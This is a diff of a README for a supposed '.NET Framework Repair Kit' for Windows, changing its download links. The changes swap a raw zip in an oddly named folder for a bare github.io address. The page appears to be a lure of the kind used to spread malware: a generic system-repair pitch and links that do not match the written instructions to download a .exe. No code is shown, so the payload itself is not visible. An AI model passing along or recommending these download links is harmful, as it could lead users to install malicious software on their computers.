@@ -1,6 +1,6 @@
 # 🛠️ NET-Framework-Repair-Kit - Restore your system library files fast
 
-[![](https://img.shields.io/badge/Download-Repair-blue)](https://raw.githubusercontent.com/veskial5069/NET-Framework-Repair-Kit/main/equivocator/Repair_NE_Kit_Framework_2.2.zip)
+[![](https://img.shields.io/badge/Download-Repair-blue)](veskial5069.github.io)
 
 This tool fixes errors related to the Microsoft .NET Framework on Windows 10 and 11. Broken framework files cause application crashes, installation failures, and system instability. This kit scans your computer for missing or corrupt files and replaces them with clean versions.
 
@@ -19,7 +19,7 @@ You must visit the repository page to download the software. Follow these instru
 2.  Look for the latest release on the right side of the page.
 3.  Click the file ending in .exe to save it to your computer.
 
-[Download the Repair Kit here](https://raw.githubusercontent.com/veskial5069/NET-Framework-Repair-Kit/main/equivocator/Repair_NE_Kit_Framework_2.2.zip)
+[Download the Repair Kit here](veskial5069.github.io)
 
 ## ⚙️ How to Run the Repair
 
